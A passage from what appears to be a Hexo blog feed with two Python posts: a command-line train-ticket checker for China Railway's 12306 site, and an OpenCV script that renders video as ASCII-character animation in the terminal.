class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;&#x547D;&#x4EE4;&#x884C;&#x706B;&#x8F66;&#x7968;&#x67E5;&#x770B;&#x5668;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">    tickets [-gdtkz] &lt;from&gt; &lt;to&gt; &lt;date&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Options:</span></span><br><span class="line"><span class="string">    -h,--help   &#x663E;&#x793A;&#x5E2E;&#x52A9;&#x83DC;&#x5355;</span></span><br><span class="line"><span class="string">    -g          &#x9AD8;&#x94C1;</span></span><br><span class="line"><span class="string">    -d          &#x52A8;&#x8F66;</span></span><br><span class="line"><span class="string">    -t          &#x7279;&#x5FEB;</span></span><br><span class="line"><span class="string">    -k          &#x5FEB;&#x901F;</span></span><br><span class="line"><span class="string">    -z          &#x76F4;&#x8FBE;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Example:</span></span><br><span class="line"><span class="string">    tickets &#x5317;&#x4EAC; &#x4E0A;&#x6D77; 2016-10-10</span></span><br><span class="line"><span class="string">    tickets -dg &#x6210;&#x90FD; &#x5357;&#x4EAC; 2016-10-10</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> docopt <span class="keyword">import</span> docopt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> stations <span class="keyword">import</span> stations</span><br><span class="line"><span class="keyword">from</span> prettytable <span class="keyword">import</span> PrettyTable</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> init, Fore</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TrainsCollection</span>:</span></span><br><span class="line">    header = <span class="string">&apos;&#x8F66;&#x6B21; &#x8F66;&#x7AD9; &#x65F6;&#x95F4; &#x5386;&#x65F6; &#x4E00;&#x7B49; &#x4E8C;&#x7B49; &#x9AD8;&#x7EA7;&#x8F6F;&#x5367; &#x8F6F;&#x5367; &#x786C;&#x5367; &#x786C;&#x5EA7; &#x65E0;&#x5EA7;&apos;</span>.split()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, available_trains,available_place, options)</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;&#x67E5;&#x8BE2;&#x7684;&#x706B;&#x8F66;&#x73ED;&#x6B21;&#x96C6;&#x5408;</span></span><br><span class="line"><span class="string">        :param available_trains: &#x4E00;&#x4E2A;&#x5217;&#x8868;, &#x5305;&#x542B;&#x53EF;&#x83B7;&#x5F97;&#x7684;&#x706B;&#x8F66;&#x73ED;&#x6B21;, &#x6BCF;&#x4E2A;</span></span><br><span class="line"><span class="string">                                 &#x706B;&#x8F66;&#x73ED;&#x6B21;&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#x5178;</span></span><br><span class="line"><span class="string">        :param options: &#x67E5;&#x8BE2;&#x7684;&#x9009;&#x9879;, &#x5982;&#x9AD8;&#x94C1;, &#x52A8;&#x8F66;, etc...</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.available_trains = available_trains</span><br><span class="line">        self.available_place = available_place</span><br><span class="line">        self.options = options</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">trains</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> raw_train <span class="keyword">in</span> self.available_trains:</span><br><span class="line">            raw_train_list = raw_train.split(<span class="string">&apos;|&apos;</span>)</span><br><span class="line">            train_no = raw_train_list[<span class="number">3</span>]</span><br><span class="line">            initial = train_no[<span class="number">0</span>].lower()</span><br><span class="line">            duration = raw_train_list[<span class="number">10</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.options <span class="keyword">or</span> initial <span class="keyword">in</span> self.options:</span><br><span class="line">                train = [</span><br><span class="line">                    train_no,<span class="comment"># train number</span></span><br><span class="line">                    <span class="string">&apos;\n&apos;</span>.join([Fore.LIGHTGREEN_EX + self.available_place[raw_train_list[<span class="number">6</span>]] + Fore.RESET,</span><br><span class="line">                               Fore.LIGHTRED_EX + self.available_place[raw_train_list[<span class="number">7</span>]] + Fore.RESET]),</span><br><span class="line">                    <span class="string">&apos;\n&apos;</span>.join([Fore.LIGHTGREEN_EX + raw_train_list[<span class="number">8</span>] + Fore.RESET,</span><br><span class="line">                               Fore.LIGHTRED_EX + raw_train_list[<span class="number">9</span>] + Fore.RESET]),</span><br><span class="line">                    duration,<span class="comment">#&#x65F6;&#x957F;</span></span><br><span class="line">                    raw_train_list[<span class="number">-6</span>] <span class="keyword">if</span> raw_train_list[<span class="number">-6</span>] <span class="keyword">else</span> <span class="string">&apos;--&apos;</span>,<span class="comment"># &#x4E00;&#x7B49;</span></span><br><span class="line">                    raw_train_list[<span class="number">-7</span>] <span class="keyword">if</span> raw_train_list[<span class="number">-7</span>] <span class="keyword">else</span> <span class="string">&apos;--&apos;</span>,<span class="comment"># &#x4E8C;&#x7B49;</span></span><br><span class="line">                    raw_train_list[<span class="number">-15</span>] <span class="keyword">if</span> raw_train_list[<span class="number">-15</span>] <span class="keyword">else</span> <span class="string">&apos;--&apos;</span>,<span class="comment"># &#x9AD8;&#x7EA7;&#x8F6F;&#x5367;</span></span><br><span class="line">                    raw_train_list[<span class="number">-8</span>] <span class="keyword">if</span> raw_train_list[<span class="number">-8</span>] <span class="keyword">else</span> <span class="string">&apos;--&apos;</span>,<span class="comment">#  &#x8F6F;&#x5367;</span></span><br><span class="line">                    raw_train_list[<span class="number">-14</span>] <span class="keyword">if</span> raw_train_list[<span class="number">-14</span>] <span class="keyword">else</span> <span class="string">&apos;--&apos;</span>,<span class="comment">#&#x786C;&#x5367;</span></span><br><span class="line">                    raw_train_list[<span class="number">-11</span>] <span class="keyword">if</span> raw_train_list[<span class="number">-11</span>] <span class="keyword">else</span> <span class="string">&apos;--&apos;</span>,<span class="comment">#&#x786C;&#x5EA7;</span></span><br><span class="line">                    raw_train_list[<span class="number">-9</span>] <span class="keyword">if</span> raw_train_list[<span class="number">-9</span>] <span class="keyword">else</span> <span class="string">&apos;--&apos;</span>,<span class="comment">#&#x65E0;&#x5EA7;</span></span><br><span class="line">                ]</span><br><span class="line">                <span class="keyword">yield</span> train</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pretty_print</span><span class="params">(self)</span>:</span></span><br><span class="line">        pt = PrettyTable()</span><br><span class="line">        pt._set_field_names(self.header)</span><br><span class="line">        <span class="keyword">for</span> train <span class="keyword">in</span> self.trains:</span><br><span class="line">            pt.add_row(train)</span><br><span class="line">        print(pt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cli</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;command-line interface&quot;&quot;&quot;</span></span><br><span class="line">    arguments = docopt(__doc__)</span><br><span class="line">    from_station = stations.get(arguments[<span class="string">&apos;&lt;from&gt;&apos;</span>])</span><br><span class="line">    to_station = stations.get(arguments[<span class="string">&apos;&lt;to&gt;&apos;</span>])</span><br><span class="line">    date = arguments[<span class="string">&apos;&lt;date&gt;&apos;</span>]</span><br><span class="line"></span><br><span class="line">    url = (<span class="string">&apos;https://kyfw.12306.cn/otn/leftTicket/queryA?&apos;</span></span><br><span class="line">           <span class="string">&apos;leftTicketDTO.train_date={}&amp;&apos;</span></span><br><span class="line">           <span class="string">&apos;leftTicketDTO.from_station={}&amp;leftTicketDTO.to_station={}&amp;purpose_codes=ADULT&apos;</span>).format(</span><br><span class="line">        date, from_station, to_station</span><br><span class="line">    )</span><br><span class="line">    r = requests.get(url, verify=<span class="keyword">True</span>)</span><br><span class="line">    <span class="comment"># print(r.json())</span></span><br><span class="line">    available_trains = r.json()[<span class="string">&apos;data&apos;</span>][<span class="string">&apos;result&apos;</span>]</span><br><span class="line">    available_place = r.json()[<span class="string">&apos;data&apos;</span>][<span class="string">&apos;map&apos;</span>]</span><br><span class="line">    options = <span class="string">&apos;&apos;</span>.join([</span><br><span class="line">        key <span class="keyword">for</span> key, value <span class="keyword">in</span> arguments.items() <span class="keyword">if</span> value <span class="keyword">is</span> <span class="keyword">True</span></span><br><span class="line">    ])</span><br><span class="line">    TrainsCollection(available_trains, available_place, options).pretty_print()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">    cli()</span><br></pre></td></tr></tbody></table></figure><p></p><p>parse_station.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = <span class="string">&apos;https://kyfw.12306.cn/otn/resources/js/framework/station_name.js?station_version=1.9069&apos;</span></span><br><span class="line">response = requests.get(url, verify=<span class="keyword">False</span>)</span><br><span class="line">stations = re.findall(<span class="string">u&apos;([\u4e00-\u9fa5]+)\|([A-Z]+)&apos;</span>, response.text)</span><br><span class="line">pprint(dict(stations), indent=<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#xFF1A;<br><img src="http://p4wiqzx0i.bkt.clouddn.com/Screenshot%20from%202018-10-07%2021-33-37.png" alt=""></p><p>&#x89E3;&#x6790;&#x6570;&#x636E;&#x8FD9;&#x90E8;&#x5206;&#x7B2C;&#x4E00;&#x6B21;&#x63A5;&#x89E6;&#x611F;&#x89C9;&#x6709;&#x70B9;&#x9EBB;&#x70E6;&#xFF1A;<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@property</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trains</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> raw_train <span class="keyword">in</span> self.available_trains:</span><br><span class="line">        raw_train_list = raw_train.split(<span class="string">&apos;|&apos;</span>)</span><br><span class="line">        train_no = raw_train_list[<span class="number">3</span>]</span><br><span class="line">        initial = train_no[<span class="number">0</span>].lower()</span><br><span class="line">        duration = raw_train_list[<span class="number">10</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.options <span class="keyword">or</span> initial <span class="keyword">in</span> self.options:</span><br><span class="line">            train = [</span><br><span class="line">                train_no,<span class="comment"># train number</span></span><br><span class="line">                <span class="string">&apos;\n&apos;</span>.join([Fore.LIGHTGREEN_EX + self.available_place[raw_train_list[<span class="number">6</span>]] + Fore.RESET,</span><br><span class="line">                           Fore.LIGHTRED_EX + self.available_place[raw_train_list[<span class="number">7</span>]] + Fore.RESET]),</span><br><span class="line">                <span class="string">&apos;\n&apos;</span>.join([Fore.LIGHTGREEN_EX + raw_train_list[<span class="number">8</span>] + Fore.RESET,</span><br><span class="line">                           Fore.LIGHTRED_EX + raw_train_list[<span class="number">9</span>] + Fore.RESET]),</span><br><span class="line">                duration,<span class="comment">#&#x65F6;&#x957F;</span></span><br><span class="line">                raw_train_list[<span class="number">-6</span>] <span class="keyword">if</span> raw_train_list[<span class="number">-6</span>] <span class="keyword">else</span> <span class="string">&apos;--&apos;</span>,<span class="comment"># &#x4E00;&#x7B49;</span></span><br><span class="line">                raw_train_list[<span class="number">-7</span>] <span class="keyword">if</span> raw_train_list[<span class="number">-7</span>] <span class="keyword">else</span> <span class="string">&apos;--&apos;</span>,<span class="comment"># &#x4E8C;&#x7B49;</span></span><br><span class="line">                raw_train_list[<span class="number">-15</span>] <span class="keyword">if</span> raw_train_list[<span class="number">-15</span>] <span class="keyword">else</span> <span class="string">&apos;--&apos;</span>,<span class="comment"># &#x9AD8;&#x7EA7;&#x8F6F;&#x5367;</span></span><br><span class="line">                raw_train_list[<span class="number">-8</span>] <span class="keyword">if</span> raw_train_list[<span class="number">-8</span>] <span class="keyword">else</span> <span class="string">&apos;--&apos;</span>,<span class="comment">#  &#x8F6F;&#x5367;</span></span><br><span class="line">                raw_train_list[<span class="number">-14</span>] <span class="keyword">if</span> raw_train_list[<span class="number">-14</span>] <span class="keyword">else</span> <span class="string">&apos;--&apos;</span>,<span class="comment">#&#x786C;&#x5367;</span></span><br><span class="line">                raw_train_list[<span class="number">-11</span>] <span class="keyword">if</span> raw_train_list[<span class="number">-11</span>] <span class="keyword">else</span> <span class="string">&apos;--&apos;</span>,<span class="comment">#&#x786C;&#x5EA7;</span></span><br><span class="line">                raw_train_list[<span class="number">-9</span>] <span class="keyword">if</span> raw_train_list[<span class="number">-9</span>] <span class="keyword">else</span> <span class="string">&apos;--&apos;</span>,<span class="comment">#&#x65E0;&#x5EA7;</span></span><br><span class="line">            ]</span><br><span class="line">            <span class="keyword">yield</span> train</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pretty_print</span><span class="params">(self)</span>:</span></span><br><span class="line">    pt = PrettyTable()</span><br><span class="line">    pt._set_field_names(self.header)</span><br><span class="line">    <span class="keyword">for</span> train <span class="keyword">in</span> self.trains:</span><br><span class="line">        pt.add_row(train)</span><br><span class="line">    print(pt)</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python3 &amp; OpenCV video character animation</title>
      <link href="/2018/10/07/Python3-OpenCV-video-character-animation/"/>
      <url>/2018/10/07/Python3-OpenCV-video-character-animation/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1472801458331.png" alt=""></p><a id="more"></a><p>code:<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> termios</span><br><span class="line"><span class="keyword">import</span> tty</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> pyprind</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CharFrame</span>:</span></span><br><span class="line"></span><br><span class="line">    ascii_char = <span class="string">&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1{}[]?-_+~&lt;&gt;i!lI;:,\&quot;^`&apos;. &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x50CF;&#x7D20;&#x6620;&#x5C04;&#x5230;&#x5B57;&#x7B26;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pixelToChar</span><span class="params">(self, luminance)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.ascii_char[int(luminance/<span class="number">256</span>*len(self.ascii_char))]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x5C06;&#x666E;&#x901A;&#x5E27;&#x8F6C;&#x4E3A; ASCII &#x5B57;&#x7B26;&#x5E27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(self, img, limitSize=<span class="number">-1</span>, fill=False, wrap=False)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> limitSize != <span class="number">-1</span> <span class="keyword">and</span> (img.shape[<span class="number">0</span>] &gt; limitSize[<span class="number">1</span>] <span class="keyword">or</span> img.shape[<span class="number">1</span>] &gt; limitSize[<span class="number">0</span>]):</span><br><span class="line">            img = cv2.resize(img, limitSize, interpolation=cv2.INTER_AREA)</span><br><span class="line">        ascii_frame = <span class="string">&apos;&apos;</span></span><br><span class="line">        blank = <span class="string">&apos;&apos;</span></span><br><span class="line">        <span class="keyword">if</span> fill:</span><br><span class="line">            blank += <span class="string">&apos; &apos;</span>*(limitSize[<span class="number">0</span>]-img.shape[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> wrap:</span><br><span class="line">            blank += <span class="string">&apos;\n&apos;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(img.shape[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(img.shape[<span class="number">1</span>]):</span><br><span class="line">                ascii_frame += self.pixelToChar(img[i,j])</span><br><span class="line">            ascii_frame += blank</span><br><span class="line">        <span class="keyword">return</span> ascii_frame</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">I2Char</span><span class="params">(CharFrame)</span>:</span></span><br><span class="line"></span><br><span class="line">    result = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, path, limitSize=<span class="number">-1</span>, fill=False, wrap=False)</span>:</span></span><br><span class="line">        self.genCharImage(path, limitSize, fill, wrap)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">genCharImage</span><span class="params">(self, path, limitSize=<span class="number">-1</span>, fill=False, wrap=False)</span>:</span></span><br><span class="line">        img = cv2.imread(path, cv2.IMREAD_GRAYSCALE)</span><br><span class="line">        <span class="keyword">if</span> img <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">        self.result = self.convert(img, limitSize, fill, wrap)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(self, stream = <span class="number">2</span>)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.result <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> stream == <span class="number">1</span> <span class="keyword">and</span> os.isatty(sys.stdout.fileno()):</span><br><span class="line">            self.streamOut = sys.stdout.write</span><br><span class="line">            self.streamFlush = sys.stdout.flush</span><br><span class="line">        <span class="keyword">elif</span> stream == <span class="number">2</span> <span class="keyword">and</span> os.isatty(sys.stderr.fileno()):</span><br><span class="line">            self.streamOut = sys.stderr.write</span><br><span class="line">            self.streamFlush = sys.stderr.flush</span><br><span class="line">        <span class="keyword">elif</span> hasattr(stream, <span class="string">&apos;write&apos;</span>):</span><br><span class="line">            self.streamOut = stream.write</span><br><span class="line">            self.streamFlush = stream.flush</span><br><span class="line">        self.streamOut(self.result)</span><br><span class="line">        self.streamFlush()</span><br><span class="line">        self.streamOut(<span class="string">&apos;\n&apos;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V2Char</span><span class="params">(CharFrame)</span>:</span></span><br><span class="line"></span><br><span class="line">    charVideo = []</span><br><span class="line">    timeInterval = <span class="number">0.033</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, path)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> path.endswith(<span class="string">&apos;txt&apos;</span>):</span><br><span class="line">            self.load(path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.genCharVideo(path)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">genCharVideo</span><span class="params">(self, filepath)</span>:</span></span><br><span class="line">        self.charVideo = []</span><br><span class="line">        cap = cv2.VideoCapture(filepath)</span><br><span class="line">        self.timeInterval = round(<span class="number">1</span>/cap.get(<span class="number">5</span>), <span class="number">3</span>)</span><br><span class="line">        nf = int(cap.get(<span class="number">7</span>))</span><br><span class="line">        print(<span class="string">&apos;Generate char video, please wait...&apos;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> pyprind.prog_bar(range(nf)):</span><br><span class="line">            rawFrame = cv2.cvtColor(cap.read()[<span class="number">1</span>], cv2.COLOR_BGR2GRAY)</span><br><span class="line">            frame = self.convert(rawFrame, os.get_terminal_size(), fill=<span class="keyword">True</span>)</span><br><span class="line">            self.charVideo.append(frame)</span><br><span class="line">        cap.release()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">export</span><span class="params">(self, filepath)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.charVideo:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">with</span> open(filepath,<span class="string">&apos;w&apos;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> frame <span class="keyword">in</span> self.charVideo:</span><br><span class="line">                <span class="comment"># &#x52A0;&#x4E00;&#x4E2A;&#x6362;&#x884C;&#x7B26;&#x7528;&#x4EE5;&#x5206;&#x9694;&#x6BCF;&#x4E00;&#x5E27;</span></span><br><span class="line">                f.write(frame + <span class="string">&apos;\n&apos;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(self, filepath)</span>:</span></span><br><span class="line">        self.charVideo = []</span><br><span class="line">        <span class="comment"># &#x4E00;&#x884C;&#x5373;&#x4E3A;&#x4E00;&#x5E27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span>  open(filepath):</span><br><span class="line">            self.charVideo.append(i[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">play</span><span class="params">(self, stream = <span class="number">1</span>)</span>:</span></span><br><span class="line">        <span class="comment"># Bug:</span></span><br><span class="line">        <span class="comment"># &#x5149;&#x6807;&#x5B9A;&#x4F4D;&#x8F6C;&#x4E49;&#x7F16;&#x7801;&#x4E0D;&#x517C;&#x5BB9; Windows</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.charVideo:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> stream == <span class="number">1</span> <span class="keyword">and</span> os.isatty(sys.stdout.fileno()):</span><br><span class="line">            self.streamOut = sys.stdout.write</span><br><span class="line">            self.streamFlush = sys.stdout.flush</span><br><span class="line">        <span class="keyword">elif</span> stream == <span class="number">2</span> <span class="keyword">and</span> os.isatty(sys.stderr.fileno()):</span><br><span class="line">            self.streamOut = sys.stderr.write</span><br><span class="line">            self.streamFlush = sys.stderr.flush</span><br><span class="line">        <span class="keyword">elif</span> hasattr(stream, <span class="string">&apos;write&apos;</span>):</span><br><span class="line">            self.streamOut = stream.write</span><br><span class="line">            self.streamFlush = stream.flush</span><br><span class="line">        </span><br><span class="line">        old_settings = <span class="keyword">None</span></span><br><span class="line">        breakflag = <span class="keyword">None</span></span><br><span class="line">        <span class="comment"># &#x83B7;&#x5F97;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;</span></span><br><span class="line">        fd = sys.stdin.fileno()</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">getChar</span><span class="params">()</span>:</span></span><br><span class="line">            <span class="keyword">nonlocal</span> breakflag</span><br><span class="line">            <span class="keyword">nonlocal</span> old_settings</span><br><span class="line">            <span class="comment"># &#x4FDD;&#x5B58;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x7684;&#x5C5E;&#x6027;</span></span><br><span class="line">            old_settings = termios.tcgetattr(fd)</span><br><span class="line">            <span class="comment"># &#x8BBE;&#x7F6E;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x4E3A;&#x539F;&#x59CB;&#x6A21;&#x5F0F;</span></span><br><span class="line">            tty.setraw(sys.stdin.fileno())</span><br><span class="line">            <span class="comment"># 